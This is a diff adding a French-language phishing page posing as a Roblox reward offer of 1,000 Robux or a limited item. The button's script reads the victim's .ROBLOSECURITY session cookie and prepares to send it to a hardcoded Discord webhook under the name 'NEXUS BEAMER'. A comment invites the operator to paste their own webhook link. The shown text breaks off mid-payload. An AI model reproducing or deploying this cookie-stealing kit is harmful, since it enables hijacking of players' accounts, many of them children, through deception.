@@ -1,1 +1,85 @@
+<!DOCTYPE html>
 
+<html lang="fr">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Roblox - Récompense Exclusive</title>
+
+    <style>
+
+        body { background-color: #1b1d1f; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; }
+
+        .card { background: #2b2e31; border-radius: 8px; padding: 40px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+
+        h1 { color: #00b06f; }
+
+        .btn { background-color: #00b06f; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 18px; }
+
+        .btn:hover { background-color: #008f5a; }
+
+        p { color: #bdc3c7; }
+
+    </style>
+
+</head>
+
+<body>
+
+
+
+    <div class="card">
+
+        <img src="https://images.rbxcdn.com/f989e52e5b72186987f27e504c38bc6a.png" width="100" alt="Roblox Logo"><br><br>
+
+        <h1>FÉLICITATIONS !</h1>
+
+        <p>Tu as été sélectionné pour recevoir <b>1 000 Robux</b> ou un <b>Item Limité</b>.</p>
+
+        <p>Clique sur le bouton ci-dessous pour valider ton compte et recevoir ton gain.</p><br>
+
+        
+
+        <button onclick="beam()" class="btn">RÉCUPÉRER MA RÉCOMPENSE</button>
+
+    </div>
+
+
+
+    <script>
+
+    async function beam() {
+
+        // --- COLLE TON LIEN DISCORD CI-DESSOUS ---
+
+        const webhookURL = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9"; 
+
+        
+
+        // Récupération du Cookie .ROBLOSECURITY
+
+        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+
+
+
+        if (!cookie) {
+
+            // Si pas de cookie (pas connecté sur ce navigateur), on simule une erreur
+
+            alert("Erreur de session : Connecte-toi d'abord à Roblox sur ce navigateur.");
+
+            return;
+
+        }
+
+
+
+        const payload = {
+
+            username: "NEXUS BEAMER",
+
+            avatar_url: "
